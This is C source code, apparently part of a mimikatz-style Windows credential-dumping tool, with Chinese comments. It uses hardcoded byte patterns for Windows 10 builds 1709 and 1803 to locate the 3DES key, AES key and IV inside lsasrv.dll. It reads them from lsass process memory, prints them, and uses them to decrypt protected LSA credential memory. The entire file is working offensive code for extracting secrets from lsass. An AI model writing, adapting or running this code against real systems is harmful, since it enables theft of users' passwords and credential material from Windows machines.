#include "stdafx.h"
#include <Windows.h>
#include "lsasrv.h"
#include "process.h"
#include "cng.h"

static IMAGE_PATTERN lsasrv_h3deskey[] = {
	{0x000a00003fab0135, 0x50245c8944db3345, -4}, //win10x64 1709
	{0x000a000042ee00fe, 0x50245c8944db3345, -4}, //win10x64 1803

	{0, 0, 0}
};

static IMAGE_PATTERN lsasrv_haeskey[] = {
	{ 0x000a00003fab0135, 0xe18341c91b45d8f7, -4 }, //win10x64 1709
	{ 0x000a000042ee00fe, 0x5de900000010b941, -4 }, //win10x64 1803

	{ 0, 0, 0 }
};

static IMAGE_PATTERN lsasrv_IV[] = {
	{0x000a00003fab0135, 0x7f0ff307e083c28b, -4}, //win10x64 1709
	{0x000a000042ee00fe, 0xc2f65824447f0ff3, -4}, //win10x64 1803
	{0, 0, 0}
};
#define MAX_KEY 128
#define MAX_IV  16

BYTE  szIV[MAX_IV]  = { 0 };
DWORD cbIV = MAX_IV;
BYTE  sz3DesKey[MAX_KEY] = { 0 };
DWORD cb3DesKey = 0;
BYTE  szAesKey[MAX_KEY]  = { 0 };
DWORD cbAesKey  = 0;


BOOL FindBcryptKeys()
{
	/*  Win10 lsasrv.dll, 目前没找到特殊方法，靠传统的硬编码来找
	LsaUnprotectMemory:
	.text:000007FF7D018700                               LsaUnprotectMemory proc near            ; CODE XREF: CredpMarshalCredential(_CANONICAL_CREDENTIAL *,uchar *,ulong *,uchar *)+496p
	.text:000007FF7D018700                                                                       ; CredpWritePinToCsp(_CREDENTIAL_SETS *,_CANONICAL_CREDENTIAL *)+2CDp ...
	.text:000007FF7D018700 45 33 C0                                      xor     r8d, r8d        ; int
	.text:000007FF7D018703 E9 A8 89 FF FF                                jmp     ?LsaEncryptMemory@@YAXPEAEKH@Z ; LsaEncryptMemory(uchar *,ulong,int)
	.text:000007FF7D018703                               LsaUnprotectMemory endp
	LsaEncryptMemory:
	00007FFB15D3E08C 48 85 C9             test        rcx, rcx
	00007FFB15D3E08F 0F 84 A2 00 00 00    je          LsaEncryptMemory + 0ABh(07FFB15D3E137h)
	00007FFB15D3E095 48 83 EC 78          sub         rsp, 78h
	00007FFB15D3E099 48 8B 05 88 86 12 00 mov         rax, qword ptr[__security_cookie(07FFB15E66728h)]
	00007FFB15D3E0A0 48 33 C4             xor         rax, rsp
	00007FFB15D3E0A3 48 89 44 24 68       mov         qword ptr[rsp + 68h], rax
	00007FFB15D3E0A8 4C 8B 15 69 D6 12 00 mov         r10, qword ptr[h3DesKey(07FFB15E6B718h)]
	00007FFB15D3E0AF 45 33 DB             xor         r11d, r11d
	00007FFB15D3E0B2 44 89 5C 24 50       mov         dword ptr[rsp + 50h], r11d
	00007FFB15D3E0B7 85 D2                test        edx, edx
	00007FFB15D3E0B9 74 6B                je          LsaEncryptMemory + 9Ah(07FFB15D3E126h)
	00007FFB15D3E0BB 0F 10 05 3E D6 12 00 movups      xmm0, xmmword ptr[InitializationVector(07FFB15E6B700h)]
	00007FFB15D3E0C2 8B C2                mov         eax, edx
	00007FFB15D3E0C4 83 E0 07 and eax, 7
	00007FFB15D3E0C7 F3 0F 7F 44 24 58    movdqu      xmmword ptr[rsp + 58h], xmm0
	00007FFB15D3E0CD 4C 0F 45 15 3B D6 12 00 cmovne      r10, qword ptr[hAesKey(07FFB15E6B710h)]
	00007FFB15D3E0D5 F7 D8                neg         eax
	*/
	HMODULE hModule = LoadLibraryW(L"lsasrv");
	LPBYTE lpStart = (LPBYTE)hModule;
	LPBYTE lpEnd   = (LPBYTE)GetProcAddress(hModule, "InitializeLsaExtension");

	LPVOID lpPtr = FindPatternFromModule(hModule, (PIMAGE_PATTERN) &lsasrv_h3deskey, lpStart, lpEnd, 0);
	GOTO_MSG_IF(lpPtr == NULL, cleanup, L"Cant find h3deskey pointer, maybe unsupport this version\r\n");

	//从lsass进程读取h3deskey指针
	BOOL bRet = ReadLsassMemory(lpPtr, &lpPtr, sizeof(LPVOID));
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
	//读取h3deskey结构，其为一个bcrypt handle
	KIWI_BCRYPT_HANDLE_KEY szBcryptHandleKey;
	bRet = ReadLsassMemory(lpPtr, &szBcryptHandleKey, sizeof(szBcryptHandleKey));
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);

	//MESSAGE(L"h3deskey structure=> Size:%x, Tag:%x, Keyptr:%p\r\n", szBcryptHandleKey.size,
	//		szBcryptHandleKey.tag, szBcryptHandleKey.key);
	//读取bcrypt key, kiwi_bcrypt_key81适用于win10，这里应对不同系统进行“适配”，这里未做
	KIWI_BCRYPT_KEY81 szBcryptKey;
	bRet = ReadLsassMemory(szBcryptHandleKey.key, &szBcryptKey, sizeof(szBcryptKey));
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);

	//输出3deskey
	cb3DesKey = szBcryptKey.hardkey.cbSecret;
	CopyMemory(sz3DesKey, (LPVOID)&szBcryptKey.hardkey.data, cb3DesKey);
	
	//从lsass读取aeskey
	lpPtr = FindPatternFromModule(hModule, (PIMAGE_PATTERN)&lsasrv_haeskey, lpStart, lpEnd, 0);
	GOTO_MSG_IF(lpPtr == NULL, cleanup, L"Cant find haeskey pointer, maybe unsupport this version\r\n");
	bRet = ReadLsassMemory(lpPtr, &lpPtr, sizeof(LPVOID));
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
	bRet = ReadLsassMemory(lpPtr, &szBcryptHandleKey, sizeof(szBcryptHandleKey));
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
	//MESSAGE(L"haeskey structure=> Size:%x, Tag:%x, Keyptr:%p\r\n", szBcryptHandleKey.size,
	//		szBcryptHandleKey.tag, szBcryptHandleKey.key);
	bRet = ReadLsassMemory(szBcryptHandleKey.key, &szBcryptKey, sizeof(szBcryptKey));
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
	//输出aeskey
	cbAesKey = szBcryptKey.hardkey.cbSecret;
	CopyMemory(szAesKey, (LPVOID)&szBcryptKey.hardkey.data, cbAesKey);

	//查找IV
	lpPtr = FindPatternFromModule(hModule, (PIMAGE_PATTERN)&lsasrv_IV, lpStart, lpEnd, 0);
	//IV共16个字节，3des使用8，aes使用16
	bRet = ReadLsassMemory(lpPtr, szIV, cbIV);
	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);

	MESSAGE(L"3DES Key => Size:%x, Key array: ", cb3DesKey);
	HexDump((LPBYTE)&sz3DesKey, cb3DesKey, FALSE);
	MESSAGE(L"AES Key  => Size:%x, Key array: ", cbAesKey);
	HexDump((LPBYTE)&szAesKey, cbAesKey, FALSE);
	MESSAGE(L"IV  => IV array: ");
	HexDump(szIV, cbIV, FALSE);
cleanup:
	FreeLibrary(hModule);
	return bRet;
}

BOOL LsaEncryptMemory(IN OUT LPBYTE lpBuf, IN DWORD cbBuf, IN INT unused)
{
	/*
	MESSAGE(L"3DES Key => Size:%x, Key array: ", cb3DesKey);
	HexDump((LPBYTE)&sz3DesKey, cb3DesKey, FALSE);
	MESSAGE(L"AES Key  => Size:%x, Key array: ", cbAesKey);
	HexDump((LPBYTE)&szAesKey, cbAesKey, FALSE);
	MESSAGE(L"IV  => IV array: ");
	HexDump(szIV, cbIV, FALSE);
	*/
	return DesDecrypt(lpBuf, cbBuf, sz3DesKey, cb3DesKey, szIV, cbIV, lpBuf, cbBuf);
}